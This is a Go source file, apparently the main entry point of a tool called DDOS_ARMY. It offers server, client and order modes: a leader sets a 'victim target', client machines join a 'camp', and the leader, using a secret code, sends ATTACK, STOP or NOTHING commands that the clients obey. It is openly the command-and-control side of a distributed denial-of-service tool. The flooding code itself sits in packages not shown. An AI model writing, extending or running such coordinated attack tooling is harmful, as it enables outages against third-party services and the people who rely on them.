package main

import (
	"DDOS_ARMY/camp"
	"DDOS_ARMY/client"
	"DDOS_ARMY/server"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	var serverListenHost, serverTargetHost, serverLeaderName string
	var clientConnectHost, clientName string
	var orderConnectHost, orderSecretCode, orderOrder string

	serverCmd := flag.NewFlagSet("server", flag.ExitOnError)
	serverCmd.StringVar(&serverListenHost, "l", "0.0.0.0", "listening host")
	serverCmd.StringVar(&serverListenHost, "listen", "0.0.0.0", "listening host")
	serverCmd.StringVar(&serverTargetHost, "t", "", "victim target")
	serverCmd.StringVar(&serverTargetHost, "target", "", "victim target")
	serverCmd.StringVar(&serverLeaderName, "n", "#Sir Jeo", "leader name")
	serverCmd.StringVar(&serverLeaderName, "name", "#Sir Jeo", "leader name")

	clientCmd := flag.NewFlagSet("client", flag.ExitOnError)
	clientCmd.StringVar(&clientConnectHost, "c", "", "host to connect to")
	clientCmd.StringVar(&clientConnectHost, "connect", "", "host to connect to")
	clientCmd.StringVar(&clientName, "n", client.GetHostName(), "name of machine")
	clientCmd.StringVar(&clientName, "name", client.GetHostName(), "name of machine")

	orderCmd := flag.NewFlagSet("order", flag.ExitOnError)
	orderCmd.StringVar(&orderConnectHost, "c", "", "host to connect to")
	orderCmd.StringVar(&orderConnectHost, "connect", "", "host to connect to")
	orderCmd.StringVar(&orderSecretCode, "s", "", "leader authorization code")
	orderCmd.StringVar(&orderSecretCode, "secret", "", "leader authorization code")
	orderCmd.StringVar(&orderOrder, "o", "", "order (attack/a, stop/s, nothing/n)")
	orderCmd.StringVar(&orderOrder, "order", "", "order (attack/a, stop/s, nothing/n)")

	if len(os.Args) < 2 {
		client.PrintUsage()
		os.Exit(1)
	}

	switch os.Args[1] {

	case "server":
		serverCmd.Parse(os.Args[2:])
		if serverTargetHost == "" {
			color.Red("Error: missing mandatory argument: target")
			serverCmd.Usage()
			os.Exit(1)
		}
		// start new server
		camp.NewCamp(serverLeaderName, serverTargetHost)
		client.PrintBanner()
		server.StartServer(serverListenHost, "8080")

	case "client":
		clientCmd.Parse(os.Args[2:])
		if clientConnectHost == "" {
			color.Red("Error: missing mandatory argument: connect")
			clientCmd.Usage()
			os.Exit(1)
		}

		// start new client

		cl := client.NewClient(clientName, &http.Client{Transport: &http.Transport{MaxIdleConns: 1}}, clientConnectHost)

		_, err := cl.Ping()
		if err != nil {
			color.Red("You can't join the camp, the leader server is not available")
			os.Exit(1)
		}

		cl.JoinCamp()

		var prevCamp camp.Camp
		go func() {
			for {
				i, err := cl.GetCampInfo()
				if err != nil {
					color.Red("You can't get the camp info, the leader server is not available")
					os.Exit(1)
				}
				cp := client.MapToCampInfo(i.(map[string]interface{}))
				if !cp.Equals(prevCamp) {
					//clear the screen
					fmt.Print("\033[H\033[2J")
					client.PrintBanner()
					client.DisplayCampInfo(cp)
					prevCamp = cp
				}
				time.Sleep(3 * time.Second)
			}

		}()

		cl.ListenToOrders()

	case "order":
		orderCmd.Parse(os.Args[2:])
		if orderConnectHost == "" {
			color.Red("Error: missing mandatory argument: connect")
			orderCmd.Usage()
			os.Exit(1)
		}
		if orderSecretCode == "" {
			color.Red("Error: missing mandatory argument: secret")
			orderCmd.Usage()
			os.Exit(1)
		}

		cl := client.NewClient(clientName, &http.Client{Transport: &http.Transport{MaxIdleConns: 1}}, orderConnectHost)
		m, err := cl.MakeOrder(strings.ToUpper(camp.NOTHING), orderSecretCode)
		if m != "OK" {
			color.Red("Error: " + m.(string))
			os.Exit(1)
		}
		if err != nil {
			color.Red("Error: " + err.Error())
			os.Exit(1)
		}
		var prevCamp camp.Camp
		var order string

		go func() {
			for {
				i, err := cl.GetCampInfo()
				if err != nil {
					color.Red("You can't get the camp info, the leader server is not available")
					os.Exit(1)
				}

				cp := client.MapToCampInfo(i.(map[string]interface{}))
				if !cp.Equals(prevCamp) {
					//clear the screen
					fmt.Print("\033[H\033[2J")
					client.PrintBanner()
					client.DisplayCampInfo(cp)
					fmt.Println("(attack/a, stop/s, nothing/n):")
					prevCamp = cp
				}
				time.Sleep(3 * time.Second)
			}
		}()
		for {
			fmt.Scanln(&order)
			//order to Upper
			order = strings.ToUpper(order)
			if order == "A" {
				order = "ATTACK"
			}
			if order == "S" {
				order = "STOP"
			}
			if order == "N" {
				order = "NOTHING"
			}
			if order != "ATTACK" && order != "STOP" && order != "NOTHING" {
				color.Red("Error: invalid order: %s", order)
				continue
			}

			m, err := cl.MakeOrder(strings.ToUpper(order), orderSecretCode)
			if err != nil {
				color.Red("Error: " + err.Error())
				os.Exit(1)
			}
			message := m.(string)
			if message != "OK" {
				color.Red("Error: " + message)
				os.Exit(1)
			}
			color.Green("Order sent Successfully: " + order)
		}
	}
}
